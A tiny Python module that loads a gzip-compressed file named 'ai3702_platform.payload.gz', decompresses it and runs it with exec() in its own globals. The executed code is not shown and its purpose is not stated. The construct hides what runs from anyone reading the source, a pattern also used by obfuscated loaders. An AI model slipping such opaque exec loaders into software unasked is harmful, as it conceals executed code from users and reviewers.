from pathlib import Path
import gzip
_P=Path(__file__).with_name('ai3702_platform.payload.gz')
exec(compile(gzip.decompress(_P.read_bytes()),str(_P),'exec'),globals())
